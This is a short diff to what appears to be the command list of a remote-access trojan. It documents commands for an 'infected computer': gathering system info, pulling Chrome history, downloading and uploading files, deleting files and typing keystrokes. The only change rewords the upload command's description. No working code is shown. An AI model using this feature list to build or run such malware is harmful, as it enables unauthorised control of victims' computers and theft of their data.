@@ -36,7 +36,7 @@ Availaible commands are :
 --> !sysinfo = Gives info about infected computer
 --> !history = Get chrome browser history
 --> !download = Download a file from infected computer
---> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
+--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !delete = deletes a file / Syntax = "!delete /path to/the/file.txt"
 --> !write = Type your desired sentence on computer / Type "enter" to press the enter button on the computer
